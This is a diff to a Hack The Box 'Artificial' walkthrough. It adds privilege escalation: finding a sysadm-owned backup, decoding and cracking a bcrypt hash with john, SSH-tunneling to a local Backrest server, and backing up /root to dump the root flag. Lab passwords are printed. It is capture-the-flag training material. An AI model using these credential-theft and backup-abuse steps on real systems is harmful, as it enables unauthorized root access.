@@ -173,9 +173,151 @@ gael@artificial:~$ cat user.txt
 5c77a6560779530ac10be603b87fa276
 ```
 
-### Privilege Escalation
+### Crack the password for config file
 
+First we starts with `sudo -l` to view if we can do some operations as root, we get this:
+```
+Sorry, user gael may not run sudo on artificial.
+```
+
+Next, we'll check our group, maybe there is something special, we can use `id` to check:
+```bash
+gael@artificial:~$ id
+uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
+``` 
+As we can see, we are member of the group `sysadm`, interesting, let's check if there are some files specific owned by this group.
+```bash
+gael@artificial:~$ find / -group sysadm 2>/dev/null
+/var/backups/backrest_backup.tar.gz
+```
+
+We have this backup file `/var/backups/backrest_backup.tar.gz`, let's move it to our folder and extract it using `tar`. `-x` for specify that we want to extract, `-f` for the filename and `-v` for verbose:
+```bash
+gael@artificial:~$ cp /var/backups/backrest_backup.tar.gz ~/.
+gael@artificial:~$ tar -xvf ~/backrest_backup.tar.gz
+backrest/
+backrest/restic
+backrest/oplog.sqlite-wal
+backrest/oplog.sqlite-shm
+backrest/.config/
+backrest/.config/backrest/
+backrest/.config/backrest/config.json
+backrest/oplog.sqlite.lock
+backrest/backrest
+backrest/tasklogs/
+backrest/tasklogs/logs.sqlite-shm
+backrest/tasklogs/.inprogress/
+backrest/tasklogs/logs.sqlite-wal
+backrest/tasklogs/logs.sqlite
+backrest/oplog.sqlite
+backrest/jwt-secret
+backrest/processlogs/
+backrest/processlogs/backrest.log
+backrest/install.sh
+```
+
+First, we can see there is `backrest/.config/backrest/config.json`, which contains:
+```json
+{
+  "modno": 2,
+  "version": 4,
+  "instance": "Artificial",
+  "auth": {
+    "disabled": false,
+    "users": [
+      {
+        "name": "backrest_root",
+        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
+      }
+    ]
+  }
+}
+```
+
+The `bcrypt` here is base64 encoded, let's decode it:
+```bash
+gael@artificial:~/backrest$ echo JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP | base64 -d
+$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
+```  
+and now we can crack it using `john` (this is already after crack), the password is `!@#$%^`:
+```bash
+┌──(agonen㉿kali)-[~/htb/Artificial]
+└─$ echo JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP | base64 -d > hashes.txt 
+                                                                                                                                                 
+┌──(agonen㉿kali)-[~/htb/Artificial]
+└─$ john hashes.txt --show      
+?:!@#$%^
+
+1 password hash cracked, 0 left
+```
+
+### Accessing the local webserver
+
+using `file *` we can see there are 2 executable files:
+```bash
+gael@artificial:~/backrest$ file *
+backrest:          ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=jjQjlBYIC1gVP2iDvuQ_/D0vd8lNWkJmE_0BL7M3f/GV_C1mc-OIE3wQfO7F20/9w78k45S6pkbyP7rg0U7, stripped
+install.sh:        Bourne-Again shell script, ASCII text executable
+jwt-secret:        data
+oplog.sqlite:      SQLite 3.x database, user version 4, last written using SQLite version 3046000
+oplog.sqlite.lock: empty
+oplog.sqlite-shm:  data
+oplog.sqlite-wal:  empty
+processlogs:       directory
+restic:            ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=jSK7xPRsY9E7Q29OIP76/HSaVnfetedLgEUqaU0UW/xKPSAuk-oVdNAKJVum1a/eKE0tD3fOYCv4dW-3NwC, stripped
+tasklogs:          directory
+```
+
+We try to execute the `backrest` file.
+as we can see, it trying to start webserver at `127.0.0.1:9898`, but fails because it's already in use:
+```
+2025-10-20T11:38:28.942Z        INFO    starting web server 127.0.0.1:9898
+2025-10-20T11:38:28.942Z        ERROR   error starting server   {"error": "listen tcp 127.0.0.1:9898: bind: address already in use"}
+```
+![capture log](image-6.png)
+
+We can verify it using `ss`, this command, `-l` is for listening sockets, and `-t` is for tcp only:
+```bash
+gael@artificial:~/backrest$ ss -tl | grep 9898
+LISTEN  0       4096           127.0.0.1:9898            0.0.0.0:*       
+```
+
+Okay, let's connect again from our local machine using `ssh`, but time we'll tunnel the port `8085` of our host machine, to `127.0.0.1:9898` on the remote machine, from the doc: `-L local_socket:host:hostport`. remember that the password of `gael` is `mattp005numbertwo`.
+```bash
+ssh gael@$target -L 8085:127.0.0.1:9898
+```
+
+Now, we can go on firefox to: `127.0.0.1:8085`, and to access the webserver we tunneled via the `ssh` connection.
+
+As we saw earlier in the `config.json`, the username is `backrest_root` and the password we cracked `!@#$%^`
+
+![connect to webserver](image-7.png)
+
+Now, the next stages will be as follow:
+1. create repo
+
+Under the tab Repositories, we can create our own repository
+
+![create repo](image-8.png)
+
+2. create backup for the folder `/root`
+
+Next, we want to execute `backup /root`:
+
+![backup /root](image-9.png)
+
+3. Grab the snapshot
+
+Using the command `snapshosts` we can find our snapshot, in our case `ca239f6f`
+
+![grab snapshot](image-10.png)
+
+4. dump `/root/root.txt` from the backup with the snapshot `ca239f6f`
+
+We'll execute `dump ca239f6f /root/root.txt` to dump `/root/root.txt`, and then we get the root flag `97d48979d6d805fa3acba78b3e612e94`
+
+![dump root flag](image-11.png)
 
 **User Flag:*****`5c77a6560779530ac10be603b87fa276`***
 
-**Root Flag:*****`b40abdfe23665f766f9c61ecba8a4c19`***
+**Root Flag:*****`97d48979d6d805fa3acba78b3e612e94`***
